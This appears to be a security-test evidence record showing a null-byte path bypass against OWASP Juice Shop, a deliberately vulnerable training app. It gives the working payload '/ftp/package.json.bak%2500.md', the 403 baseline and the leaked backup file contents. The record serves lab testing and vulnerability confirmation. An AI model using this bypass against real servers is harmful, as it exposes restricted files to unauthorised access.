response_evidence:
BASELINE (raw path blocked): GET /ftp/package.json.bak returned HTTP 403 Forbidden, body: "Error: Only .md and .pdf files are allowed! ... at verify (/juice-shop/build/routes/fileServer.js:55:18)". This proves the server enforces an extension whitelist (.md/.pdf) and denies the .bak backup file.

BYPASS (null-byte traversal): GET /ftp/package.json.bak%2500.md returned HTTP 200 (Content-Type: application/octet-stream). The URL-encoded null byte (%2500 -> %00) truncates the filename so the verify() check sees a trailing .md while the filesystem reads package.json.bak. The response body contains the actual restricted backup file content, e.g.:
{
  "name": "juice-shop",
  "version": "6.2.0-SNAPSHOT",
  "description": "An intentionally insecure JavaScript Web Application",
  "author": "Björn Kimminich <bjoern.kimminich@owasp.org> ...",
  "dependencies": { "body-parser": "~1.18", "express": "~4.16", "sequelize": "~4", "sqlite3": "~3.1.13", ... }
}

BOTH conditions hold: 403 on raw .bak path AND 200-with-backup-file-content via %2500.md null-byte bypass. Confirmed CWE-22.
